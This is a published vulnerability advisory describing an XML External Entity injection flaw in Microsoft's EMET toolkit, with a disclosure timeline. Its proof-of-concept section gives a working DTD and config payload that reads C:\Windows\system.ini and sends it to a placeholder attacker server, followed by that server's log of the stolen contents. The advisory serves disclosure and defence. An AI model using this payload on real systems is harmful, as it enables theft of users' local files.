@@ -1,0 +1,112 @@
+[+] Credits: John Page (aka hyp3rlinx)	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/MICROSOFT-WINDOWS-EMET-XML-INJECTION.txt
+[+] ISR: Apparition Security     
+
+
+
+***Greetz: indoushka|Eduardo|Dirty0tis|cor3sm4sh3r***     
+ 
+
+
+Vendor:
+================
+www.microsoft.com
+
+
+Product:
+===========
+Enhanced Mitigation Experience Toolkit (EMET)
+
+Enhanced Mitigation Experience Toolkit is a freeware security toolkit for Microsoft Windows, developed by Microsoft.
+It provides a unified interface to enable and fine-tune Windows security features. 
+
+
+
+Vulnerability Type:
+===================
+XML External Entity Injection
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+Security Issue:
+================
+EMETs XML parser does not account for external entity declarations in ".config" files. This allows outbound network connections and users local files
+to be exfiltrated to remote attacker controlled server. Conditions are a user must be tricked into importing a specially crafted XML file.
+
+
+
+Exploit/POC:
+=============
+1) python -m SimpleHTTPServer
+
+
+2) "payload.dtd" 
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://ATTACK-SERVER:8000?%file;'>">
+%all;
+
+
+3) "config.xml" 
+
+import into EMET interface.
+
+
+<?xml version="1.0"?>
+<!DOCTYPE emet_poc [ 
+<!ENTITY % file SYSTEM "C:\Windows\system.ini">
+<!ENTITY % dtd SYSTEM "http://ATTACK-SERVER:8000/payload.dtd">
+%dtd;]>
+<pwn>&send;</pwn>
+
+
+Result seen on ATTACK-SERVER:
+=============================
+
+C:\sec>python -m SimpleHTTPServer
+Serving HTTP on 0.0.0.0 port 8000 ...
+PC - - [19/May/2018 22:53:02] "GET /payload.dtd HTTP/1.1" 200 -
+PC - - [19/May/2018 22:53:02] "GET /?;%20for%2016-bit%20app%20support%0D%0A[386Enh]%0D%0Awoafont=dosapp.fon%0D%0AEGA80WOA.FON=EGA8
+0WOA.FON%0D%0AEGA40WOA.FON=EGA40WOA.FON%0D%0ACGA80WOA.FON=CGA80WOA.FON%0D%0ACGA40WOA.FON=CGA40WOA.FON%0D%0A%0D%0A[drivers]%0D%0Awa
+ve=mmdrv.dll%0D%0Atimer=timer.drv%0D%0A%0D%0A[mci] HTTP/1.1" 301 -
+PC - - [19/May/2018 22:53:02] "GET /?;%20for%2016-bit%20app%20support%0D%0A[386Enh]%0D%0Awoafont=dosapp.fon%0D%0AEGA80WOA.FON=EGA8
+0WOA.FON%0D%0AEGA40WOA.FON=EGA40WOA.FON%0D%0ACGA80WOA.FON=CGA80WOA.FON%0D%0ACGA40WOA.FON=CGA40WOA.FON%0D%0A%0D%0A[drivers]%0D%0Awa
+
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+Severity:
+=========
+High
+
+
+
+Disclosure Timeline:
+=============================
+Vendor Notification: June 5, 2018
+Vendor reply : "We determined your finding is valid but does not meet our bar for servicing" : June 30, 2018
+June 30, 2018 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
